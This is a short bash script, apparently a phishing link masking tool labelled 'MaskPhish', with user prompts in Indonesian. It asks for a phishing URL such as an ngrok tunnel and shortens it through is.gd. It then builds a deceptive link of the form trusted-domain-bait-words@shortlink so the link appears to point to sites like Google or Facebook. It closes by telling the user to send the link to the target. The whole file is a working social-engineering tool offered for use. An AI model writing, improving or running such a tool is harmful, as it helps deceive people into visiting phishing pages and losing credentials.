# Bash Script for Hide Phishing URL Created by KP

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Silahkan gunakan http or https.\e[0m"
            exit 1
        fi
    fi
}
printf "\n"
printf "\e[1;92m   ___  ___          _   ______ _     _     _       \e[0m\n"
printf "\e[1;92m   |  \/  |         | |  | ___ \ |   (_)   | |      \e[0m\n"
printf "\e[1;92m   | .  . | __ _ ___| | _| |_/ / |__  _ ___| |__    \e[0m\n"
printf "\e[1;92m   | |\/| |/ _  / __| |/ /  __/|  _ \| / __|  _ \   \e[0m\n"
printf "\e[1;92m   | |  | | (_| \__ \   <| |   | | | | \__ \ | | |  \e[0m\n"
printf "\e[1;92m   \_|  |_/\__,_|___/_|\_\_|   |_| |_|_|___/_| |_|  \e[0m\n"
printf "\n"
printf "\e[1;93m     .:.:.\e[0m\e[1;94m Samarkan URL Phishing by Team-42 \e[0m\e[1;93m.:.:.\e[0m\n\n"
printf "  \e[101m\e[1;77m:: Digunakan untuk menyamarkan alamat Domain   ::\e[0m\n"
printf " \n"
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m \n"
echo -n "Paste kan URL Phishing disini (ex. https://123456789.ngrok.io): "
read phish
url_checker $phish
sleep 1
echo "Memproses dan Modifikasi Phishing URL"
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### URL Penyamaran ###\e[0m"
echo 'URL Phishing untuk pengelabuhan/penyamaran (ex: https://google.com, http://facebook.com) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nTulis kata2 social engineering untuk mengelabuhi target:(ex. uang-gratis, video-viral)'
echo -e "\e[101mJangan gunakan spasi, hanya gunakan '-' antar kata social engineering\e[0m"
echo -en "\e[32m=>\e[0m "
read words
echo -e "\nMenggenerate Link MaskPhish...\n"
final=$mask-$words@$shorter
echo -e "Sukses, Ini hasil URL MaskPhish :\e[32m ${final} \e[0m\n"
echo -e "Silahkan Copy Paste dan kirim ke target.\n"

